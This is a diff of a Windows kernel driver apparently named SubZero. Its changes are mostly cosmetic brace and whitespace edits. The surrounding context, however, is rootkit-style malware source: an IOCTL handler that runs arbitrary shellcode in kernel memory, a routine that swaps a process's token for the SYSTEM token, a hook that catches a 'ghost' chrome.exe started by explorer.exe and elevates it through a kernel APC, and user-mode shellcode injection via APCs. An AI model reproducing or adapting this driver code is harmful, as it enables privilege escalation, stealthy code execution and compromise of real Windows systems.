@@ -2,8 +2,8 @@
 #include "SubZero.h"
 
 extern "C" NTSTATUS
-DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
-
+DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) 
+{
 	KdPrint((DRIVER_PREFIX "[+] Driver was loaded\n"));
 
 	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"12345.6171");
@@ -18,7 +18,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	};
 	OB_CALLBACK_REGISTRATION reg = {
 		OB_FLT_REGISTRATION_VERSION,
-		1,				// operation count
+		1,					// operation count
 		altitude,			// altitude
 		nullptr,			// context
 		operations
@@ -89,7 +89,8 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	LARGE_INTEGER interval;
 	interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
 	do {
-		if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) {
+		if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) 
+		{
 			g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
 			KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
 			break;
@@ -199,7 +200,7 @@ NTSTATUS ExecuteShellcode_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 		
 		auto* const picAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
 		if (nullptr == picAddress) {
-			KdPrint((DRIVER_PREFIX "[-] Error allocating PIC space\n"));
+			KdPrint((DRIVER_PREFIX "[-] Error allocating PIS space\n"));
 			return STATUS_INSUFFICIENT_RESOURCES;
 		}
 		
@@ -245,7 +246,7 @@ NTSTATUS ExecuteShellcode_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 		// Set returned data buffer size
 		Irp->IoStatus.Information = picParameters.ReturnedDataMaxSize;
 
-		// Free PIC memory
+		// Free PIS memory
 		::ExFreePoolWithTag(returnedDataAddress, DRIVER_TAG);
 		::ExFreePoolWithTag(picAddress, DRIVER_TAG);
 
@@ -310,8 +311,8 @@ NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 			return status;
 		
 		auto* const token = ::PsReferencePrimaryToken(process);		// Get the process token										
-		status = SetTokenToSystem(process, token);			// Replace the process token with system token		
-		::ObDereferenceObject(token);					// Dereference the process token
+		status = SetTokenToSystem(process, token);					// Replace the process token with system token		
+		::ObDereferenceObject(token);								// Dereference the process token
 
 		return status;
 	}
@@ -321,7 +322,8 @@ NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 	}
 }
 
-NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
+NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) 
+{
 	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo = nullptr;
 	PCUNICODE_STRING name = nullptr;
 
@@ -348,7 +350,8 @@ NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
 	return STATUS_SUCCESS;
 }
 
-OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION Info) {
+OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION Info) 
+{
 	if (Info->KernelHandle)
 		return OB_PREOP_SUCCESS;
 
@@ -367,15 +370,16 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION I
 void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 {
 	// Thread creation only
-	if (!Create) return;
+	if (!Create) 
+		return;
 
 	PETHREAD thread;
 	const auto pid = ::HandleToULong(ProcessId);
 	const auto tid = ::HandleToULong(ThreadId);
 
 	// Search for an explorer Thread
-	if (pid == g_Globals.ExplorerPID) {
-
+	if (pid == g_Globals.ExplorerPID) 
+	{
 		// Check if a launcher Thread was already found
 		if (g_Globals.ExplorerLauncherThreadID != 0) 
 			return;
@@ -403,7 +407,8 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 	else if (pid == g_Globals.ChromePID)
 	{
 		// Check if the first Thread was already found
-		if (g_Globals.ChromeFirstThreadID != 0) return;
+		if (g_Globals.ChromeFirstThreadID != 0) 
+			return;
 
 		KdPrint((DRIVER_PREFIX "[+] Chrome first Thread catched. TID: %d\n", tid));
 		g_Globals.ChromeFirstThreadID = tid;
@@ -414,10 +419,10 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 			
 			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
 				{				
-					auto* const process = ::PsGetCurrentProcess();		// Get current process (i.e. chrome.exe)
+					auto* const process = ::PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
 					auto* const token = ::PsReferencePrimaryToken(process);	// Get the process token
-					SetTokenToSystem(process, token);			// Replace the process token with system token
-					::ObDereferenceObject(token);				// Dereference the process token
+					SetTokenToSystem(process, token);						// Replace the process token with system token
+					::ObDereferenceObject(token);							// Dereference the process token
 					
 					// Thread and Process creation notification callbacks are not needed anymore
 					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
@@ -435,11 +440,12 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
 	// Process creation only
-	if (!CreateInfo) return;
+	if (!CreateInfo) 
+		return;
 
 	auto pid = ::HandleToULong(ProcessId);
-	if (g_Globals.ChromePID == 0) {
-
+	if (g_Globals.ChromePID == 0) 
+	{
 		// Search for our ghost chrome 
 		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) {
 			KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
@@ -448,7 +454,8 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
 	}
 }
 
-NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) {
+NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) 
+{
 	auto* apc = static_cast<KAPC*>(::ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG));
 	if (nullptr == apc) {
 		KdPrint((DRIVER_PREFIX "[-] Error allocating KAPC structure\n"));
@@ -460,12 +467,12 @@ NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFun
 		Thread,
 		OriginalApcEnvironment,
 		[](PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*) {::ExFreePoolWithTag(apc, DRIVER_TAG); }, // Kernel APC
-		[](const PKAPC apc)																		   // Rundown APC
+		[](const PKAPC apc)																				   // Rundown APC
 		{
 			::ExFreePoolWithTag(apc, DRIVER_TAG);
 			::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 		}, 
-		ApcFunction,																							   // Normal APC
+		ApcFunction,                                                                                       // Normal APC
 		Mode,
 		nullptr
 	);
@@ -487,7 +494,8 @@ NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFun
 	return STATUS_SUCCESS;
 }
 
-void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) {
+void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) 
+{
 	KdPrint((DRIVER_PREFIX "[+] InjectUsermodeShellcodeAPC invoked\n"));
 
 	SIZE_T pageAlligndShellcodeSize = ShellcodeSize;
@@ -522,7 +530,8 @@ void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) {
 			false,
 			nullptr
 		);
-		if (!mdl) break;
+		if (!mdl) 
+			break;
 
 		::MmProbeAndLockPages(
 			mdl,
@@ -539,7 +548,8 @@ void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) {
 			false,
 			NormalPagePriority
 		);
-		if (!mappedAddress) break;
+		if (!mappedAddress) 
+			break;
 
 		// Change protection
 		status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
@@ -549,7 +559,8 @@ void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) {
 	} while (false);
 
 	if (!successful) {
-		if (mdl) {
+		if (mdl) 
+		{
 			if (mappedAddress) {
 				KdPrint((DRIVER_PREFIX "[-] Error protecting MDL pages\n"));
 				::MmUnmapLockedPages(mappedAddress, mdl);
